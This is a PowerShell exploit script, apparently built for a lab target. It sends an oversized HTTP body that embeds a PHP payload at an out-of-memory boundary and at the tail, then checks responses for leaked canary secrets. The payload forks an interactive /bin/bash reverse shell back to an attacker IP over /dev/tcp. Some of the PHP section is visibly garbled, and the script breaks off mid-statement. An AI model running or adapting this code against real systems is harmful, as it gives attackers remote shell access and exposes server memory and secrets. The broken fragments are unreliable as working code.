# ------------------------------------------------------------------ payload
# Runs inside the PHP worker. Forks a child that opens an interactive
# /bin/bash on a socket back to the attacker; the HTTP request itself returns
# immediately so the worker stays free for the follow-up request. The /tmp
# guard means duplicate executions (both payload copies, re-runs) = one shell.
$payload = @'
<?php

  @file_put_contents('/tmp/.p2s_done', '1');

  $ip = '__SHELLIP__';
  $port = __SHELLPORT__;

    $pid = pcntl_fork();

        }
        sleep(1);
      }
      exit(0);

      "bash -c 'i=0; while [ \$i -lt 60 ]; do rm -f /tmp/.p2s_shell; (exec 3<>/dev/tcp/%s/%d 2>/dev/null && touch /tmp/.p2s_shell && exec /bin/bash -i <&3 >&3 2>&3) && break; [ -f /tmp/.p2s_shell ] && break; i=\$((i+1)); sleep 1; done' >/dev/null 2>&1 &'",
      $ip,
      $port
    );

$payload      = $payload.Replace('__SHELLIP__', $ShellIp).Replace('__SHELLPORT__', [string]$ShellPort)
$payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payload)

# Canary lines: valid PHP (comments) AND look like leaked secrets.
$canary = [System.Text.Encoding]::ASCII.GetBytes("//api_key=sk-lab-canary-9f8e7d6c5b4a3210 PHPSESSID=labp2s0001`n")

function New-ExploitBody {
    param(
        [long]$Total,
        [byte[]]$PayloadBytes,
        [byte[]]$Canary
    )

    if ($Total -lt $PayloadBytes.Length) {
        throw "BodySize is too small for the payload."
    }

    $body = New-Object byte[] $Total
    $tile = New-Object byte[] 1MB

    $i = 0
    while ($i -lt 1MB) {
        $n = [Math]::Min($Canary.Length, 1MB - $i)
        [Array]::Copy($Canary, 0, $tile, $i, $n)
        $i += $n
    }

    $j = 0
    while ($j -lt $Total) {
        [Array]::Copy($tile, 0, $body, $j, [Math]::Min(1MB, $Total - $j))
        $j += 1MB
    }

    # payload #1 at the expected OOM boundary (halfway), #2 at the very end (the tail)
    [Array]::Copy($PayloadBytes, 0, $body, [int]($Total / 2), $PayloadBytes.Length)
    [Array]::Copy($PayloadBytes, 0, $body, $Total - $PayloadBytes.Length, $PayloadBytes.Length)

    return $body
}

function Invoke-HttpRequest {
    param(
        [string]$TargetHost,
        [int]$Port,
        [string]$Method,
        [string]$Path,
        [byte[]]$Body,
        [string]$ContentType = 'application/x-www-form-urlencoded',
        [int]$Keep = 0
    )

    $c = New-Object System.Net.Sockets.TcpClient

    try {
        $c.Connect($TargetHost, $Port)
        $s = $c.GetStream()

        $hdr = "$Method $Path HTTP/1.1`r`nHost: $TargetHost`r`nContent-Type: $ContentType`r`nContent-Length: $($Body.Length)`r`nConnection: close`r`n`r`n"
        $hb  = [System.Text.Encoding]::ASCII.GetBytes($hdr)

        $s.Write($hb, 0, $hb.Length)

        $off = 0
        while ($off -lt $Body.Length) {
            $n = [Math]::Min(1MB, $Body.Length - $off)
            $s.Write($Body, $off, $n)
            $off += $n
        }

        $s.Flush()

        $ms  = New-Object System.IO.MemoryStream
        $buf = New-Object byte[] 65536
        $got = 0

        while ($true) {
            $n = $s.Read($buf, 0, $buf.Length)
            if ($n -le 0) { break }

            $ms.Write($buf, 0, $n)
            $got += $n

            if ($Keep -gt 0 -and $got -ge $Keep) {
                break
            }
        }

        # If we stopped early, drain the rest so the socket can close cleanly.
        if ($Keep -gt 0) {
            try {
                while ($true) {
                    $n = $s.Read($buf, 0, $buf.Length)
                    if ($n -le 0) { break }
                }
            } catch {
                # Ignore drain errors.
            }
        }

        return [PSCustomObject]@{
            Raw = $ms.ToArray()
        }
    }
    finally {
        $c.Close()
    }
}

function Show-Bits {
    param(
        [byte[]]$B,
        [int]$N = 512
    )

    if (-not $B -or $B.Length -eq 0) {
        return '(empty body)'
    }

    $s = [System.Text.Encoding]::ASCII.GetString($B, 0, [Math]::Min($N, $B.Length))
    return ($s -replace '[^\x20-\x7e]', '.')
}

function Test-Canary {
    param(
        [byte[]]$B
    )

    if (-not $B -or $B.Length -eq 0) {
        return $false
    }

    $text = [System.Text.Encoding]::UTF8.GetString($B)
    return ($text -match 'sk-lab-canary')
}

        $pump = [System.Threading.Thread]::New([ScriptBlock]::Create('
